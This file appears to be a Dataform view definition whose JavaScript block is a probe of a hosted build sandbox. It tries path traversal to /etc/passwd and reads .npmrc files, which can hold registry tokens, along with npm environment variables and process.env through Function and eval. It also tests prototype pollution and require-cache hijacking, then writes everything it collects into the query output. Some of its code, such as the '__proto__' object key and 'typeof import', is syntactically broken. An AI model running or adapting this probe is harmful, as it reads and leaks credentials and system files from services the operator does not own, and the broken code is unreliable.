config { type: "view", name: "npm_ecosystem_probe" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "npm ecosystem probe - package loading, path traversal, supply chain"
  };

  // =============================================================================
  // TEST 1: Require Paths and Module Resolution
  // =============================================================================
  results.test1_requirePaths = {};
  try {
    if (typeof require === 'undefined') {
      results.test1_requirePaths = { error: "require is undefined" };
    } else {
      const paths = require.resolve ? {} : { note: "require.resolve not available" };

      // Check module paths
      const moduleInfo = {
        paths: module.paths || [],
        filename: module.filename || null,
        id: module.id || null,
        parent: module.parent ? module.parent.filename : null
      };

      // Check require.main
      const mainInfo = require.main ? {
        filename: require.main.filename,
        paths: require.main.paths
      } : null;

      results.test1_requirePaths = {
        status: "completed",
        moduleInfo,
        mainInfo,
        resolvePaths: module.paths || []
      };
    }
  } catch(e) {
    results.test1_requirePaths = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: Installed Packages Analysis
  // =============================================================================
  results.test2_installedPackages = {};
  try {
    const fs = require('fs');
    const path = require('path');

    let packages = {};

    // Read package.json
    try {
      const pkgJson = JSON.parse(fs.readFileSync('package.json', 'utf8'));
      packages.dependencies = pkgJson.dependencies || {};
      packages.devDependencies = pkgJson.devDependencies || {};
      packages.scripts = pkgJson.scripts || {};
      packages.name = pkgJson.name;
      packages.version = pkgJson.version;
    } catch(e) {
      packages.packageJsonError = e.message.substring(0, 100);
    }

    // List node_modules
    try {
      const nodeModules = fs.readdirSync('node_modules');
      packages.installedModules = nodeModules.filter(m => !m.startsWith('.')).slice(0, 50);
      packages.installedCount = nodeModules.filter(m => !m.startsWith('.')).length;
    } catch(e) {
      packages.nodeModulesError = e.message.substring(0, 100);
    }

    // Check for lock files
    packages.lockFiles = {
      packageLock: fs.existsSync('package-lock.json'),
      yarnLock: fs.existsSync('yarn.lock'),
      pnpmLock: fs.existsSync('pnpm-lock.yaml')
    };

    results.test2_installedPackages = {
      status: "completed",
      packages
    };
  } catch(e) {
    results.test2_installedPackages = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: Path Traversal in Require
  // =============================================================================
  results.test3_pathTraversal = {};
  try {
    const traversalAttempts = {};

    // Try various path traversal patterns
    const patterns = [
      '../../../etc/passwd',
      '../../../../../../etc/passwd',
      '/etc/passwd',
      '../package.json',
      '../../package.json',
      '../../../package.json'
    ];

    for (const pattern of patterns) {
      try {
        const result = require(pattern);
        traversalAttempts[pattern] = {
          success: true,
          type: typeof result,
          preview: JSON.stringify(result).substring(0, 100)
        };
      } catch(e) {
        traversalAttempts[pattern] = {
          success: false,
          error: e.code || e.message.substring(0, 50)
        };
      }
    }

    results.test3_pathTraversal = {
      status: "completed",
      traversalAttempts
    };
  } catch(e) {
    results.test3_pathTraversal = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: Dynamic Import
  // =============================================================================
  results.test4_dynamicImport = {};
  try {
    // Check if dynamic import is available
    const importTests = {
      importAvailable: typeof import === 'function' || false,
      evalAvailable: typeof eval === 'function',
      FunctionAvailable: typeof Function === 'function'
    };

    // Try Function constructor
    let functionTest = null;
    try {
      const fn = new Function('return process.env');
      const result = fn();
      functionTest = {
        success: true,
        envKeys: Object.keys(result).slice(0, 10)
      };
    } catch(e) {
      functionTest = { success: false, error: e.message.substring(0, 100) };
    }

    // Try eval
    let evalTest = null;
    try {
      const result = eval('process.version');
      evalTest = { success: true, result };
    } catch(e) {
      evalTest = { success: false, error: e.message.substring(0, 100) };
    }

    results.test4_dynamicImport = {
      status: "completed",
      importTests,
      functionTest,
      evalTest
    };
  } catch(e) {
    results.test4_dynamicImport = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: NPM Config and Registry
  // =============================================================================
  results.test5_npmConfig = {};
  try {
    const fs = require('fs');
    const env = typeof process !== 'undefined' ? process.env : {};
    const home = env.HOME || '/root';

    const npmConfig = {};

    // Read .npmrc files
    const npmrcPaths = [
      '.npmrc',
      home + '/.npmrc',
      '/etc/npmrc'
    ];

    for (const npmrcPath of npmrcPaths) {
      try {
        const content = fs.readFileSync(npmrcPath, 'utf8');
        npmConfig[npmrcPath] = content.substring(0, 500);
      } catch(e) {
        npmConfig[npmrcPath] = { error: e.message.substring(0, 50) };
      }
    }

    // Check npm env vars
    const npmEnvVars = {};
    for (const key of Object.keys(env)) {
      if (key.toLowerCase().startsWith('npm_')) {
        npmEnvVars[key] = env[key].substring(0, 100);
      }
    }

    results.test5_npmConfig = {
      status: "completed",
      npmConfig,
      npmEnvVars,
      npmEnvCount: Object.keys(npmEnvVars).length
    };
  } catch(e) {
    results.test5_npmConfig = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: Prototype Pollution via Package Loading
  // =============================================================================
  results.test6_prototypePollution = {};
  try {
    // Check current prototype state
    const beforeState = {
      objectProto: Object.keys(Object.prototype),
      arrayProto: Object.keys(Array.prototype),
      functionProto: Object.keys(Function.prototype)
    };

    // Check if common pollution targets exist
    const pollutionChecks = {
      '__proto__' in {}: true,
      constructorAccess: ({}).constructor === Object,
      prototypeWritable: null
    };

    // Try to pollute
    try {
      const testObj = JSON.parse('{"__proto__": {"polluted": true}}');
      pollutionChecks.jsonParsePollution = ({}).polluted === true;
    } catch(e) {
      pollutionChecks.jsonParseError = e.message.substring(0, 50);
    }

    // Check Object.assign behavior
    try {
      const target = {};
      const source = JSON.parse('{"__proto__": {"assigned": true}}');
      Object.assign(target, source);
      pollutionChecks.objectAssignPollution = ({}).assigned === true;
    } catch(e) {
      pollutionChecks.objectAssignError = e.message.substring(0, 50);
    }

    results.test6_prototypePollution = {
      status: "completed",
      beforeState,
      pollutionChecks
    };
  } catch(e) {
    results.test6_prototypePollution = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: Interesting Package Contents
  // =============================================================================
  results.test7_packageContents = {};
  try {
    const fs = require('fs');

    const interestingPackages = [
      '@dataform/core',
      '@google-cloud/bigquery',
      'protobufjs',
      'grpc'
    ];

    const packageDetails = {};

    for (const pkg of interestingPackages) {
      try {
        const pkgPath = `node_modules/${pkg}/package.json`;
        const pkgJson = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
        packageDetails[pkg] = {
          version: pkgJson.version,
          main: pkgJson.main,
          scripts: pkgJson.scripts ? Object.keys(pkgJson.scripts) : [],
          bin: pkgJson.bin ? Object.keys(pkgJson.bin) : []
        };
      } catch(e) {
        packageDetails[pkg] = { error: e.message.substring(0, 50) };
      }
    }

    results.test7_packageContents = {
      status: "completed",
      packageDetails
    };
  } catch(e) {
    results.test7_packageContents = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: Require Cache Manipulation
  // =============================================================================
  results.test8_cacheManipulation = {};
  try {
    if (typeof require === 'undefined' || !require.cache) {
      results.test8_cacheManipulation = { error: "require.cache not available" };
    } else {
      const cacheInfo = {
        totalCached: Object.keys(require.cache).length,
        canDelete: null,
        canModify: null
      };

      // Try to delete from cache
      const firstKey = Object.keys(require.cache)[0];
      if (firstKey) {
        try {
          const original = require.cache[firstKey];
          delete require.cache[firstKey];
          cacheInfo.canDelete = !(firstKey in require.cache);
          require.cache[firstKey] = original;  // Restore
        } catch(e) {
          cacheInfo.canDelete = false;
          cacheInfo.deleteError = e.message.substring(0, 50);
        }
      }

      // Try to modify exports
      try {
        const testModule = require.cache[firstKey];
        if (testModule && testModule.exports) {
          const originalExports = testModule.exports;
          testModule.exports = { hijacked: true };
          cacheInfo.canModify = testModule.exports.hijacked === true;
          testModule.exports = originalExports;  // Restore
        }
      } catch(e) {
        cacheInfo.canModify = false;
        cacheInfo.modifyError = e.message.substring(0, 50);
      }

      results.test8_cacheManipulation = {
        status: "completed",
        cacheInfo
      };
    }
  } catch(e) {
    results.test8_cacheManipulation = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 8,
    allCompleted: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Check for critical findings
  if (results.test3_pathTraversal) {
    const traversals = results.test3_pathTraversal.traversalAttempts || {};
    const successful = Object.entries(traversals).filter(([k, v]) => v.success);
    if (successful.length > 0) {
      results.summary.criticalFindings.push("PATH TRAVERSAL SUCCESSFUL: " + successful.map(s => s[0]).join(", "));
    }
  }

  if (results.test4_dynamicImport) {
    if (results.test4_dynamicImport.functionTest?.success) {
      results.summary.criticalFindings.push("Function constructor allows code execution");
    }
    if (results.test4_dynamicImport.evalTest?.success) {
      results.summary.criticalFindings.push("eval() is available");
    }
  }

  if (results.test8_cacheManipulation) {
    const cache = results.test8_cacheManipulation.cacheInfo || {};
    if (cache.canModify) {
      results.summary.criticalFindings.push("Require cache is modifiable - module hijacking possible");
    }
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as npm_ecosystem_probe
